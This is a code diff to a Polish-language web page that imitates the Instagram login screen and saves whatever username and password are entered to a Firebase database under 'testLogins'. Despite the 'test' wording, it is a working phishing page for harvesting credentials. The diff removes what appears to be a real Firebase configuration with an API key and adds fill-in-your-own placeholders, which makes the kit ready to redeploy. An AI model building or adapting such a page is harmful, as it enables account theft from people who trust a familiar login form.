@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Instagram</title>
+<title>Instagram Test Login</title>
 <style>
   /* Body */
   body {
@@ -65,6 +65,14 @@
     opacity: 0.9;
   }
 
+  /* Komunikat po wysłaniu */
+  #successMessage {
+    color: green;
+    margin-top: 10px;
+    display: none;
+    font-size: 14px;
+  }
+
   /* Responsywność */
   @media (max-width: 500px) {
     .login-container {
@@ -90,31 +98,35 @@
     <input type="password" id="password" placeholder="Hasło" required>
     <button type="submit">Zaloguj się</button>
   </form>
+  <div id="successMessage">Testowe dane wysłane!</div>
 </div>
 
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 <script>
+  // PODMIEN NA SWÓJ KOD Z FIREBASE
   const firebaseConfig = {
-    apiKey: "AIzaSyDjAwhA9NkAGfGBcQYOydYzo2W6qT4BEk8",
-    authDomain: "instagram-logowanie.firebaseapp.com",
-    databaseURL: "https://instagram-logowanie-default-rtdb.firebaseio.com",
-    projectId: "instagram-logowanie",
-    storageBucket: "instagram-logowanie.firebasestorage.app",
-    messagingSenderId: "182057697219",
-    appId: "1:182057697219:web:587950e0147ff941a38776",
-    measurementId: "G-QR2MVNRFM5"
+    apiKey: "TWOJE_API_KEY",
+    authDomain: "TWOJ_PROJEKT.firebaseapp.com",
+    databaseURL: "https://TWOJ_PROJEKT-default-rtdb.firebaseio.com",
+    projectId: "TWOJ_PROJEKT",
+    storageBucket: "TWOJ_PROJEKT.appspot.com",
+    messagingSenderId: "TWOJE_ID",
+    appId: "TWOJE_APP_ID"
   };
 
   firebase.initializeApp(firebaseConfig);
   const database = firebase.database();
 
   const form = document.getElementById('loginForm');
+  const successMessage = document.getElementById('successMessage');
+
   form.addEventListener('submit', (e) => {
     e.preventDefault();
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
+    // Zapis testowych danych do Firebase
     database.ref('testLogins').push({
       username,
       password,
@@ -122,7 +134,12 @@
     });
 
     form.reset();
-    alert("Testowe dane zostały wysłane!");
+
+    // Pokaż delikatny komunikat
+    successMessage.style.display = 'block';
+    setTimeout(() => {
+      successMessage.style.display = 'none';
+    }, 3000);
   });
 </script>
 
